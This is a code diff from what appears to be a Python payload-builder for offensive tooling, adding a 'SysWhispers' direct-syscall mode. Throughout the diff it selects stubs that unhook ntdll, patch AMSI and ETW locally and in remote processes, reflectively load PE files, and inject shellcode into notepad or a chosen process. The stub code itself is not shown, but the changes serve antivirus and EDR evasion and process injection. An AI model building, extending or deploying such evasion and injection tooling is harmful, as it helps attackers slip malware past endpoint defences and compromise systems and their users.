@@ -734,6 +734,9 @@ if (getfreshstub):
     stub.add(GetSyscallStub)
     stub.add(NtProtectSyscallStart)
 
+if (syswhispers):
+    stub.add(WhispersStub)
+
 if(unhook):
     if(hellsgate):
         stub.add(DInvokeUnhookStubs)
@@ -752,6 +755,10 @@ if(unhook):
         stub.add(NtCloseDelegate)
         stub.add(UnhookSyscalls)
         stub.add(UnhookStub)
+    elif(syswhispers):
+        stub.add(DInvokeUnhookStubs)
+        stub.add(Winimleanstub)
+        stub.add(WhispersUnhookStub)
 else:
     if(hellsgate):
         stub.add(WinLeanGetCurrentProcStub)
@@ -774,8 +781,6 @@ if (AMSI or ETW or peload or (localinject == false) or selfdelete):
         stub.add(FileDeleteStub)
 
 if (localinject):
-    if ((AMSI or ETW) and syswhispers):
-        stub.add(WhispersAMSIETWImportStub)
     if (AMSI):
         if (syswhispers):
             stub.add(WhispersAMSIPatchStub)
@@ -822,6 +827,8 @@ if (peload):
             stub.add(NtAllocateVirtualMemoryDelegate)
             stub.add(ProtectWriteAllocSyscalls)
             stub.add(PELoadStub)
+        elif(syswhispers):
+            stub.add(WhispersPELoadStub)
     else:   
         stub.add(RemoteProcImportStub)
         if (hellsgate):
@@ -855,7 +862,10 @@ if (shellcode):
         if (hellsgate):
             stub.add(HellsgateAllocDelegate)
             stub.add(HellsgateLocalInjectStub)
+        elif(syswhispers):
+            stub.add(WhispersLocalInjectStub)
     else:
+        stub.add(Winimleanstub)
         if (getfreshstub):
             stub.add(RemoteProcImportStub)
         if (hellsgate):
@@ -880,6 +890,25 @@ if (shellcode):
                     stub.add(HellsgateRemotePatchAMSIStub)
                 stub.add(HellsShellcoderemoteinjectStub_customprocthird)
                 stub.add(HellsShellcoderemoteinjectStub)
+        elif(syswhispers):
+            if (processname == ""):
+                stub.add(WhispersNotepadProcIDStub)
+                if (remoteETWpatch):
+                    stub.add(WhispersRemotePatchETWStub)
+                if (remoteAMSIpatch):
+                    stub.add(WhispersRemotePatchAMSIStub)
+                stub.add(WhispersShellcoderemoteinjectStub_notepad)
+                stub.add(WhispersShellcoderemoteinjectStub)
+            else:
+                stub.add(WhispersShellcoderemoteinjectStub_customprocfirst)
+                stub.add(ShellcoderemoteinjectStub_customprocseccond)
+                stub.add(WhispersShellcoderemoteinjectStub_customprocID)
+                if (remoteETWpatch):
+                    stub.add(WhispersRemotePatchETWStub)
+                if (remoteAMSIpatch):
+                    stub.add(WhispersRemotePatchAMSIStub)
+                stub.add(WhispersShellcoderemoteinjectStub_customprocthird)
+                stub.add(WhispersShellcoderemoteinjectStub)
         elif (getfreshstub):
             stub.add(RemoteInjectDelegates)
             if (processname == ""):
